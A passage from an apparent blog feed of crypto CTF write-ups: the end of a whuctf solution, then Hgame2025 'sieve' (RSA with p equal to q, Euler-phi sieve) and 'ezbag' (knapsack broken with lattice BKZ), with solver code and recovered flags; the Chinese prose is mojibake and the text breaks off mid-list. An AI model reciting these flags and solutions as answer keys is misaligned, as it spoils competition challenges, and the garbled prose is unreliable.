class="hljs-number">16</span>]<br>iv = <span class="hljs-string">b&quot;0&quot;</span> * <span class="hljs-number">16</span><br>AES = AES.new(key, AES.MODE_CBC, iv)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mt =&quot;</span>, AES.decrypt(ct))<br><span class="hljs-comment">#mt = b&#x27;whuctf&#123;You_w1ll_never_kn0w_1t!&#125;\x01&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ‰“ctfä»¥æ¥æœ€æœ‰æ„Ÿè§‰çš„ä¸€åœºæ¯”èµ›ï¼Œé…£ç•…æ·‹æ¼“ï¼Œä¹Ÿæ˜¯ç‡ƒå°½äº†ï¼Œæ„Ÿè°¢é˜Ÿå‹çš„å¸¦é£ã€‚</p><p>æ€»ç»“è‡ªå·±çš„åšé¢˜é‡è¿˜æ˜¯å¤ªå°‘ï¼Œå¯¹äºå¾ˆå¤šåŸæœ¬åº”è¯¥ä¸€çœ¼çœ‹å‡ºæ¥çš„é—®é¢˜è¿˜æ˜¯çŠ¹çŠ¹è±«è±«çš„ï¼Œç”šè‡³ä¸æ•¢ç›¸ä¿¡è‡ªå·±æ€è·¯æ˜¯å¯¹çš„ï¼Œåæ¥è¢«hintæ‹‰å›åŸæœ¬çš„æ€è·¯æ‰åšæŒåšå‡ºæ­£ç¡®ç»“æœã€‚</p><p>å› æ­¤æ—¥åè¿˜è¦åŠ å€åŠªåŠ›ï¼Œäº‰å–ä¸æ‹–é˜Ÿå‹åè…¿ï¼</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 writeup</title>
    <link href="/2025/03/25/Hgame2025%20writeup/"/>
    <url>/2025/03/25/Hgame2025%20writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025-writeupï¼ˆCryptoæ–¹å‘ï¼‰"><a href="#Hgame2025-writeupï¼ˆCryptoæ–¹å‘ï¼‰" class="headerlink" title="Hgame2025 writeupï¼ˆCryptoæ–¹å‘ï¼‰"></a>Hgame2025 writeupï¼ˆCryptoæ–¹å‘ï¼‰</h1><h2 id="1-sieve"><a href="#1-sieve" class="headerlink" title="1.sieve"></a>1.sieve</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><br>FLAG = <span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>m = bytes_to_long(FLAG)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trick</span>(<span class="hljs-params">k</span>):<br>    <span class="hljs-keyword">if</span> k &gt; <span class="hljs-number">1</span>:<br>        mul = prod(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,k))   <span class="hljs-comment">#é˜¶ä¹˜</span><br>        <span class="hljs-keyword">if</span> k - mul % k - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">65537</span><br>p = q = nextprime(trick(e^<span class="hljs-number">2</span>//<span class="hljs-number">6</span>)&lt;&lt;<span class="hljs-number">128</span>)<br>n = p * q<br>enc = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br><span class="hljs-comment">#enc=2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>åˆ†æå¹¶ç»“åˆ<strong>Wilsonå®šç†</strong>å¯çŸ¥ï¼Œæˆ‘ä»¬è¦æ±‚çš„æ˜¯ä»<code>1</code>åˆ°<code>e^2//6</code>çš„<strong>æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ</strong>åŠ ä¸Šè¿™ä¹‹é—´çš„<strong>ç´ æ•°ä¸ªæ•°</strong>ã€‚</p><p>è”ç³»é¢˜ç›®æˆ‘ä»¬å°±å¯ä»¥è”æƒ³åˆ°ç­›æ³•ï¼Œç„¶åå°±æ˜¯å†™è„šæœ¬ï¼Œè¿™é‡Œæ±‚æ¬§æ‹‰å‡½æ•°ä¹‹å’Œæ—¶pythonè„šæœ¬è¿è¡Œæ—¶é—´è¿‡é•¿ï¼Œå¹¶ä¸”æŠŠç”µè„‘æå¾—éå¸¸å¡ï¼Œäºæ˜¯å°±æ”¹æˆäº†C++ã€‚</p><p><strong>è§£ç­”</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//(ç­›æ³•æ±‚æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint64_t</span> n = <span class="hljs-number">715849728</span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">uint64_t</span>&gt; <span class="hljs-title">phi</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> i = <span class="hljs-number">0</span>; i &lt;= n; ++i) <br>    &#123;<br>        phi[i] = i;<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title">is_prime</span><span class="hljs-params">(n + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span></span>;<br>    is_prime[<span class="hljs-number">0</span>] = is_prime[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    vector&lt;<span class="hljs-type">uint32_t</span>&gt; primes;<br>    primes.<span class="hljs-built_in">reserve</span>(n / <span class="hljs-number">20</span>);             <span class="hljs-comment">// é¢„ä¼°è´¨æ•°æ•°é‡</span><br><br>    <span class="hljs-type">uint64_t</span> total = <span class="hljs-number">1</span>;                 <span class="hljs-comment">// Ï†(1) = 1</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> i = <span class="hljs-number">2</span>; i &lt;= n; ++i) <br>    &#123;<br>        <span class="hljs-keyword">if</span> (is_prime[i]) <br>        &#123;<br>            primes.<span class="hljs-built_in">push_back</span>(i);<br>            phi[i] = i - <span class="hljs-number">1</span>;<br>        &#125;<br>        total += phi[i];                <span class="hljs-comment">// ç´¯åŠ å½“å‰Ï†(i)</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> p : primes) <br>        &#123;<br>            <span class="hljs-keyword">if</span> (p &gt; n / i) <span class="hljs-keyword">break</span>;       <span class="hljs-comment">// é˜²æ­¢i*pæº¢å‡º</span><br>            <span class="hljs-type">uint64_t</span> m = i * p;<br>            is_prime[m] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (i % p == <span class="hljs-number">0</span>) <br>            &#123;<br>                phi[m] = phi[i] * p;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> <br>            &#123;<br>                phi[m] = phi[i] * (p - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;ans=&quot;</span> &lt;&lt; total &lt;&lt; endl;    <span class="hljs-comment">//155763335410704472</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">import</span> gmpy2<br><br>e = <span class="hljs-number">65537</span><br>k = e*e//<span class="hljs-number">6</span><br>sum_phi=<span class="hljs-number">155763335410704472</span>  <span class="hljs-comment">#ä¸Šä¸ªè„šæœ¬ä¸­æ±‚å‡ºçš„å€¼</span><br>enc = <span class="hljs-number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sieve_prime</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">list</span>:<br>    <span class="hljs-comment">#å„æ‹‰æ‰˜å¡ç­›æ³•</span><br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">elif</span> n == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> [<span class="hljs-number">2</span>]<br>    end = (n - <span class="hljs-number">3</span>) // <span class="hljs-number">2</span><br>    is_prime = [<span class="hljs-literal">True</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(end + <span class="hljs-number">1</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(n, <span class="hljs-number">0.5</span>)) + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>        k = (i - <span class="hljs-number">3</span>) // <span class="hljs-number">2</span>  <br>        <span class="hljs-keyword">if</span> is_prime[k]:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i * i, n + <span class="hljs-number">1</span>, <span class="hljs-number">2</span> * i):<br>                is_prime[(j - <span class="hljs-number">3</span>) // <span class="hljs-number">2</span>] = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-number">2</span>] + [<span class="hljs-number">2</span> * i + <span class="hljs-number">3</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(end + <span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> is_prime[i]]<br><br>prime_list = sieve_prime(k)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first 10 prime:&quot;</span>, prime_list[:<span class="hljs-number">10</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;last 10 prime:&quot;</span>, prime_list[-<span class="hljs-number">10</span>:])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;num== &quot;</span>,<span class="hljs-built_in">len</span>(prime_list))<br>trick_k = sum_phi + <span class="hljs-built_in">len</span>(prime_list)<br><br>shifted = trick_k &lt;&lt; <span class="hljs-number">128</span><br>p=nextprime(shifted)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p== &quot;</span>,p)<br>n = p * p<br>phi = p * (p - <span class="hljs-number">1</span>)<br><br>d=gmpy2.invert(e,phi)<br><span class="hljs-built_in">print</span>(d)<br><br>m = <span class="hljs-built_in">pow</span>(enc, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))  <span class="hljs-comment">#b&#x27;hgame&#123;sieve_is_n0t_that_HArd&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="2-ezbag"><a href="#2-ezbag" class="headerlink" title="2.ezbag"></a>2.ezbag</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-built_in">list</span> = []<br>bag = []<br>p=random.getrandbits(<span class="hljs-number">64</span>)    <br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:])==<span class="hljs-number">64</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):                              <br>    t = p<br>    a=[getPrime(<span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]        <br>    b=<span class="hljs-number">0</span>                                        <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a:<br>        temp=t%<span class="hljs-number">2</span>                               <br>        b+=temp*x                              <br>        t=t&gt;&gt;<span class="hljs-number">1</span>                                <br>    <span class="hljs-built_in">list</span>.append(a)                             <br>    bag.append(b)                              <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;list=<span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;bag=<span class="hljs-subst">&#123;bag&#125;</span>&#x27;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()  <br>cipher = AES.new(key, AES.MODE_ECB)             <br>flag = pad(flag,<span class="hljs-number">16</span>)                            <br>ciphertext = cipher.encrypt(flag)              <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ci</span></span><br><span class="hljs-subst"><span class="hljs-string"></span></span><br><span class="hljs-subst"><span class="hljs-string"><span class="hljs-string">&quot;&quot;&quot;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">list=[[2826962231, 3385780583, 3492076631, 3387360133, 2955228863, 2289302839, 2243420737, 4129435549, 4249730059, 3553886213, 3506411549, 3658342997, 3701237861, 4279828309, 2791229339, 4234587439, 3870221273, 2989000187, 2638446521, 3589355327, 3480013811, 3581260537, 2347978027, 3160283047, 2416622491, 2349924443, 3505689469, 2641360481, 3832581799, 2977968451, 4014818999, 3989322037, 4129732829, 2339590901, 2342044303, 3001936603, 2280479471, 3957883273, 3883572877, 3337404269, 2665725899, 3705443933, 2588458577, 4003429009, 2251498177, 2781146657, 2654566039, 2426941147, 2266273523, 3210546259, 4225393481, 2304357101, 2707182253, 2552285221, 2337482071, 3096745679, 2391352387, 2437693507, 3004289807, 3857153537, 3278380013, 3953239151, 3486836107, 4053147071], [2241199309, 3658417261, 3032816659, 3069112363, 4279647403, 3244237531, 2683855087, 2980525657, 3519354793, 3290544091, 2939387147, 3669562427, 2985644621, 2961261073, 2403815549, 3737348917, 2672190887, 2363609431, 3342906361, 3298900981, 3874372373, 4287595129, 2154181787, 3475235893, 2223142793, 2871366073, 3443274743, 3162062369, 2260958543, 3814269959, 2429223151, 3363270901, 2623150861, 2424081661, 2533866931, 4087230569, 2937330469, 3846105271, 3805499729, 4188683131, 2804029297, 2707569353, 4099160981, 3491097719, 3917272979, 2888646377, 3277908071, 2892072971, 2817846821, 2453222423, 3023690689, 3533440091, 3737441353, 3941979749, 2903000761, 3845768239, 2986446259, 3630291517, 3494430073, 2199813137, 2199875113, 3794307871, 2249222681, 2797072793], [4263404657, 3176466407, 3364259291, 4201329877, 3092993861, 2771210963, 3662055773, 3124386037, 2719229677, 3049601453, 2441740487, 3404893109, 3327463897, 3742132553, 2833749769, 2661740833, 3676735241, 2612560213, 3863890813, 3792138377, 3317100499, 2967600989, 2256580343, 2471417173, 2855972923, 2335151887, 3942865523, 2521523309, 3183574087, 2956241693, 2969535607, 2867142053, 2792698229, 3058509043, 3359416111, 3375802039, 2859136043, 3453019013, 3817650721, 2357302273, 3522135839, 2997389687, 3344465713, 2223415097, 2327459153, 3383532121, 3960285331, 3287780827, 4227379109, 3679756219, 2501304959, 4184540251, 3918238627, 3253307467, 3543627671, 3975361669, 3910013423, 3283337633, 2796578957, 2724872291, 2876476727, 4095420767, 3011805113, 2620098961], [2844773681, 3852689429, 4187117513, 3608448149, 2782221329, 4100198897, 3705084667, 2753126641, 3477472717, 3202664393, 3422548799, 3078632299, 3685474021, 3707208223, 2626532549, 3444664807, 4207188437, 3422586733, 2573008943, 2992551343, 3465105079, 4260210347, 3108329821, 3488033819, 4092543859, 4184505881, 3742701763, 3957436129, 4275123371, 3307261673, 2871806527, 3307283633, 2813167853, 2319911773, 3454612333, 4199830417, 3309047869, 2506520867, 3260706133, 2969837513, 4056392609, 3819612583, 3520501211, 2949984967, 4234928149, 2690359687, 3052841873, 4196264491, 3493099081, 3774594497, 4283835373, 2753384371, 2215041107, 4054564757, 4074850229, 2936529709, 2399732833, 3078232933, 2922467927, 3832061581, 3871240591, 3526620683, 2304071411, 367956082</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">bag=[123342809734, 118191282440, 119799979406, 128273451872]</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">ciphertext=b&#x27;\x1d6\xcc&#125;\x07\xfa7G\xbd\x01\xf0P4^Q&quot;\x85\x9f\xac\x98\x8f#\xb2\x12\xf4+\x05`\x80\x1a\xfa !\x9b\xa5\xc7g\xa8b\x89\x93\x1e\xedz\xd2M;\xa2&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">&quot;&quot;&quot;</span></span></span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>ç¨å¾®å˜å½¢äº†çš„èƒŒåŒ…å¯†ç ï¼ŒåŒæ—¶å‡ºç°äº†å››ç»„èƒŒåŒ…ã€‚</p><p>æ„é€ æ ¼ï¼Œä½†LLLç®—æ³•æ ¼ä¸å‡ºï¼Œè¿™é‡Œç”¨BKZå‡ºç»“æœäº†ã€‚</p><span>$$[x_1,x_2,...,x_{64},-1]\\\begin{bmatrix}2 & 0 & 0 & \cdots & 0 & list[3][-1] & list[2][-1] & list[1][-1] &list[0][-1]\\0 & 2 & 0 & \cdots & 0 & list[3][-2] & list[2][-2] & list[1][-2] &list[0][-2]\\\vdots & \vdots & \vdots & \ddots & \vdots &\vdots & \vdots & \vdots & \vdots \\0 & 0 & 0 & \cdots & 2 & list[3][0] & list[2][0] & list[1][0] &list[0][0]\\1 & 1 & 1 & \cdots & 1 & bag[3] & bag[2] & bag[1] & bag[0]\end{bmatrix}\\=[2x_1-1,2x_2-1,...,2x_{64}-1,0,0,0,0]$$</span><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-built_in">list</span>=[[<span class="hljs-number">2826962231</span>, <span class="hljs-number">3385780583</span>, <span class="hljs-number">3492076631</span>, <span class="hljs-number">3387360133</span>, <span class="hljs-number">2955228863</span>, <span class="hljs-number">2289302839</span>, <span class="hljs-number">2243420737</span>, <span class="hljs-number">4129435549</span>, <span class="hljs-number">4249730059</span>, <span class="hljs-number">3553886213</span>, <span class="hljs-number">3506411549</span>, <span class="hljs-number">3658342997</span>, <span class="hljs-number">3701237861</span>, <span class="hljs-number">4279828309</span>, <span class="hljs-number">2791229339</span>, <span class="hljs-number">4234587439</span>, <span class="hljs-number">3870221273</span>, <span class="hljs-number">2989000187</span>, <span class="hljs-number">2638446521</span>, <span class="hljs-number">3589355327</span>, <span class="hljs-number">3480013811</span>, <span class="hljs-number">3581260537</span>, <span class="hljs-number">2347978027</span>, <span class="hljs-number">3160283047</span>, <span class="hljs-number">2416622491</span>, <span class="hljs-number">2349924443</span>, <span class="hljs-number">3505689469</span>, <span class="hljs-number">2641360481</span>, <span class="hljs-number">3832581799</span>, <span class="hljs-number">2977968451</span>, <span class="hljs-number">4014818999</span>, <span class="hljs-number">3989322037</span>, <span class="hljs-number">4129732829</span>, <span class="hljs-number">2339590901</span>, <span class="hljs-number">2342044303</span>, <span class="hljs-number">3001936603</span>, <span class="hljs-number">2280479471</span>, <span class="hljs-number">3957883273</span>, <span class="hljs-number">3883572877</span>, <span class="hljs-number">3337404269</span>, <span class="hljs-number">2665725899</span>, <span class="hljs-number">3705443933</span>, <span class="hljs-number">2588458577</span>, <span class="hljs-number">4003429009</span>, <span class="hljs-number">2251498177</span>, <span class="hljs-number">2781146657</span>, <span class="hljs-number">2654566039</span>, <span class="hljs-number">2426941147</span>, <span class="hljs-number">2266273523</span>, <span class="hljs-number">3210546259</span>, <span class="hljs-number">4225393481</span>, <span class="hljs-number">2304357101</span>, <span class="hljs-number">2707182253</span>, <span class="hljs-number">2552285221</span>, <span class="hljs-number">2337482071</span>, <span class="hljs-number">3096745679</span>, <span class="hljs-number">2391352387</span>, <span class="hljs-number">2437693507</span>, <span class="hljs-number">3004289807</span>, <span class="hljs-number">3857153537</span>, <span class="hljs-number">3278380013</span>, <span class="hljs-number">3953239151</span>, <span class="hljs-number">3486836107</span>, <span class="hljs-number">4053147071</span>], [<span class="hljs-number">2241199309</span>, <span class="hljs-number">3658417261</span>, <span class="hljs-number">3032816659</span>, <span class="hljs-number">3069112363</span>, <span class="hljs-number">4279647403</span>, <span class="hljs-number">3244237531</span>, <span class="hljs-number">2683855087</span>, <span class="hljs-number">2980525657</span>, <span class="hljs-number">3519354793</span>, <span class="hljs-number">3290544091</span>, <span class="hljs-number">2939387147</span>, <span class="hljs-number">3669562427</span>, <span class="hljs-number">2985644621</span>, <span class="hljs-number">2961261073</span>, <span class="hljs-number">2403815549</span>, <span class="hljs-number">3737348917</span>, <span class="hljs-number">2672190887</span>, <span class="hljs-number">2363609431</span>, <span class="hljs-number">3342906361</span>, <span class="hljs-number">3298900981</span>, <span class="hljs-number">3874372373</span>, <span class="hljs-number">4287595129</span>, <span class="hljs-number">2154181787</span>, <span class="hljs-number">3475235893</span>, <span class="hljs-number">2223142793</span>, <span class="hljs-number">2871366073</span>, <span class="hljs-number">3443274743</span>, <span class="hljs-number">3162062369</span>, <span class="hljs-number">2260958543</span>, <span class="hljs-number">3814269959</span>, <span class="hljs-number">2429223151</span>, <span class="hljs-number">3363270901</span>, <span class="hljs-number">2623150861</span>, <span class="hljs-number">2424081661</span>, <span class="hljs-number">2533866931</span>, <span class="hljs-number">4087230569</span>, <span class="hljs-number">2937330469</span>, <span class="hljs-number">3846105271</span>, <span class="hljs-number">3805499729</span>, <span class="hljs-number">4188683131</span>, <span class="hljs-number">2804029297</span>, <span class="hljs-number">2707569353</span>, <span class="hljs-number">4099160981</span>, <span class="hljs-number">3491097719</span>, <span class="hljs-number">3917272979</span>, <span class="hljs-number">2888646377</span>, <span class="hljs-number">3277908071</span>, <span class="hljs-number">2892072971</span>, <span class="hljs-number">2817846821</span>, <span class="hljs-number">2453222423</span>, <span class="hljs-number">3023690689</span>, <span class="hljs-number">3533440091</span>, <span class="hljs-number">3737441353</span>, <span class="hljs-number">3941979749</span>, <span class="hljs-number">2903000761</span>, <span class="hljs-number">3845768239</span>, <span class="hljs-number">2986446259</span>, <span class="hljs-number">3630291517</span>, <span class="hljs-number">3494430073</span>, <span class="hljs-number">2199813137</span>, <span class="hljs-number">2199875113</span>, <span class="hljs-number">3794307871</span>, <span class="hljs-number">2249222681</span>, <span class="hljs-number">2797072793</span>], [<span class="hljs-number">4263404657</span>, <span class="hljs-number">3176466407</span>, <span class="hljs-number">3364259291</span>, <span class="hljs-number">4201329877</span>, <span class="hljs-number">3092993861</span>, <span class="hljs-number">2771210963</span>, <span class="hljs-number">3662055773</span>, <span class="hljs-number">3124386037</span>, <span class="hljs-number">2719229677</span>, <span class="hljs-number">3049601453</span>, <span class="hljs-number">2441740487</span>, <span class="hljs-number">3404893109</span>, <span class="hljs-number">3327463897</span>, <span class="hljs-number">3742132553</span>, <span class="hljs-number">2833749769</span>, <span class="hljs-number">2661740833</span>, <span class="hljs-number">3676735241</span>, <span class="hljs-number">2612560213</span>, <span class="hljs-number">3863890813</span>, <span class="hljs-number">3792138377</span>, <span class="hljs-number">3317100499</span>, <span class="hljs-number">2967600989</span>, <span class="hljs-number">2256580343</span>, <span class="hljs-number">2471417173</span>, <span class="hljs-number">2855972923</span>, <span class="hljs-number">2335151887</span>, <span class="hljs-number">3942865523</span>, <span class="hljs-number">2521523309</span>, <span class="hljs-number">3183574087</span>, <span class="hljs-number">2956241693</span>, <span class="hljs-number">2969535607</span>, <span class="hljs-number">2867142053</span>, <span class="hljs-number">2792698229</span>, <span class="hljs-number">3058509043</span>, <span class="hljs-number">3359416111</span>, <span class="hljs-number">3375802039</span>, <span class="hljs-number">2859136043</span>, <span 